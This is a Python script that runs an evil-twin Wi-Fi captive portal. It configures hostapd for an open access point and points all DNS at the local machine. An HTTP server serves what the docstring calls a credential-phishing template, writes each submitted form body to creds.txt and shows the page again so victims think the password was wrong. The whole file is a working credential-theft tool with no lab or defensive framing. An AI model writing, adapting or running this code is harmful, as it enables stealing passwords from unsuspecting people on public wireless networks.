"""Captive-portal runner.

Open hostapd + dnsmasq catch-all (resolves every name to 10.0.0.1) +
Python http.server on :80 that serves a credential-phishing template
on GET and logs POST bodies.
"""

from __future__ import annotations

import argparse
import os
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


def hostapd_conf(iface: str, ssid: str, channel: int) -> str:
    return (
        f"interface={iface}\n"
        "driver=nl80211\n"
        f"ssid={ssid}\n"
        "hw_mode=g\n"
        f"channel={channel}\n"
        "ieee80211n=1\n"
        "auth_algs=1\n"
        "wmm_enabled=1\n"
    )


def dnsmasq_conf(iface: str, log_path: Path) -> str:
    return (
        f"interface={iface}\n"
        "bind-interfaces\n"
        "dhcp-range=10.0.0.10,10.0.0.100,12h\n"
        "dhcp-option=3,10.0.0.1\n"
        "dhcp-option=6,10.0.0.1\n"
        "address=/#/10.0.0.1\n"
        "log-queries\n"
        f"log-facility={log_path}\n"
    )


def make_handler(template_html: bytes, portal_log: Path, creds_path: Path):
    class Handler(BaseHTTPRequestHandler):
        # Silence default stderr access log; we write our own portal.log.
        def log_message(self, fmt, *args):
            with portal_log.open("a") as fh:
                fh.write(f"{self.log_date_time_string()} "
                         f"{self.client_address[0]} {fmt % args}\n")

        def _serve_portal(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(template_html)))
            # Defeat HSTS/browser captive-portal helpers that bypass cache:
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(template_html)

        def do_GET(self):
            self._serve_portal()

        def do_POST(self):
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8", errors="replace")
            parsed = dict(urllib.parse.parse_qsl(body, keep_blank_values=True))
            # Log the capture event WITHOUT echoing the credentials to stdout.
            with portal_log.open("a") as fh:
                fh.write(f"{self.log_date_time_string()} "
                         f"captured POST from {self.client_address[0]} "
                         f"keys={sorted(parsed.keys())}\n")
            with creds_path.open("a") as fh:
                fh.write(body + "\n")
            # Respond with the portal again (user sees "wrong password" feel).
            self._serve_portal()

        def do_CONNECT(self):
            # HTTPS CONNECT — we can't intercept TLS cleanly.
            with portal_log.open("a") as fh:
                fh.write(f"{self.log_date_time_string()} "
                         f"HTTPS CONNECT {self.path} from "
                         f"{self.client_address[0]} — not intercepted (modern HSTS)\n")
            self.send_error(502, "HTTPS not intercepted")

    return Handler


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--workdir", required=True)
    p.add_argument("--ap-iface", required=True)
    p.add_argument("--ssid", required=True)
    p.add_argument("--channel", type=int, default=6)
    p.add_argument("--template", required=True)
    args = p.parse_args()

    workdir = Path(args.workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    hostapd_path = workdir / "hostapd.conf"
    dnsmasq_path = workdir / "dnsmasq.conf"
    hostapd_log = workdir / "hostapd.log"
    dnsmasq_log = workdir / "dnsmasq.log"
    portal_log = workdir / "portal.log"
    creds_path = workdir / "creds.txt"

    template_src = Path(args.template)
    if not template_src.is_file():
        print(f"[x] template not found: {template_src}", flush=True)
        return 2
    template_html = template_src.read_bytes()
    creds_path.touch()
    os.chmod(creds_path, 0o600)

    hostapd_path.write_text(hostapd_conf(args.ap_iface, args.ssid, args.channel))
    dnsmasq_path.write_text(dnsmasq_conf(args.ap_iface, dnsmasq_log))

    subprocess.run(["nmcli", "device", "set", args.ap_iface, "managed", "no"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "link", "set", args.ap_iface, "up"], check=False)

    hostapd_fh = open(hostapd_log, "ab")
    dnsmasq_fh = open(dnsmasq_log, "ab")
    hostapd = subprocess.Popen(["hostapd", str(hostapd_path)],
                               stdout=hostapd_fh, stderr=hostapd_fh)
    dnsmasq = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", str(dnsmasq_path)],
                               stdout=dnsmasq_fh, stderr=dnsmasq_fh)

    handler_cls = make_handler(template_html, portal_log, creds_path)
    server = HTTPServer(("10.0.0.1", 80), handler_cls)
    http_thread = threading.Thread(target=server.serve_forever, daemon=True)
    http_thread.start()

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print(f"[*] captive portal up on {args.ap_iface} SSID={args.ssid!r} "
          f"ch={args.channel}", flush=True)

    try:
        while running["go"]:
            if hostapd.poll() is not None:
                print("[x] hostapd died", flush=True)
                break
            time.sleep(1)
    finally:
        try:
            server.shutdown()
        except Exception:
            pass
        for proc in (hostapd, dnsmasq):
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in (hostapd, dnsmasq):
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        hostapd_fh.close()
        dnsmasq_fh.close()
        subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
